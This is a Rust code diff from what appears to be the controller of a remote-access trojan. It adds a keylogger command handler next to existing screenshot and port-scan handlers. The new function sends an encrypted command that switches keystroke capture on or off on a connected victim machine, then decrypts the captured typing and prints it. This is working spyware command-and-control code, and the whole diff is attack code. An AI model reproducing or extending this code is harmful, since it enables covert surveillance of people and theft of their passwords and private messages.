@@ -366,6 +366,59 @@ pub async fn handle_screenshot(active_connections: &Arc<Mutex<HashMap<String, Co
     Ok(format!("Screenshot command sent to {}.\nCheck in /tmp for linux or C:\\Windows\\Temp for windows", id))
 }
 
+pub async fn handle_keylogger(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
+    if raw_connection {
+        return Err("Screenshot command not supported for raw connections".to_string());
+    }
+    let parts: Vec<&str> = command.split(" ").collect();
+    if parts.len() < 3 {
+        return Err("Invalid command, expected 'keylogger ID on/off'".to_string());
+    }
+    let id: usize = match parts[1].trim().parse() {
+        Ok(num) => num,
+        Err(_) => return Err("Invalid ID".to_string()),
+    };
+    let state = parts[2].trim();
+    if state != "on" && state != "off" {
+        return Err("Invalid state, expected 'on' or 'off'".to_string());
+    }
+    let active_connections = active_connections.lock().await;
+    if !active_connections.values().any(|value| value.id == id) {
+        return Err("Invalid ID".to_string());
+    }
+    let keylogger_cmd = "||KEYLOGGER|| ".to_owned() + state;
+    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let stream = connection_info.stream.clone();
+    let shared_secret = connection_info.shared_secret;
+    let keylogger_cmd = encrypt(keylogger_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
+    
+    stream.lock().await.write(&keylogger_cmd).await.expect("Error writing to stream");
+    
+    if state == "off" {
+        return Ok(format!("Keylogger turned {}.\n", state));
+    }
+
+    let mut buffer = [0; 512];
+    print!("User is typing the following: ");
+    for _ in 0..10 {
+        match stream.lock().await.read(&mut buffer).await {
+            Ok(_) => {
+                let decrypted_data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
+                let data = match String::from_utf8(decrypted_data) {
+                    Ok(data) => data,
+                    Err(_) => return Err("Error converting data to string".to_string()),
+                };
+                if data.contains("|!!done!!|") {
+                    break;
+                }
+                println!("{}", data);
+            }
+            Err(err) => return Err(format!("Error receiving data: {}", err)),
+        }
+    }
+    Ok(format!("Keylogger turned {}.\n", state))
+}
+
 pub async fn handle_port_scan(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
     if raw_connection {
         return Err("Port scan command not supported for raw connections".to_string());
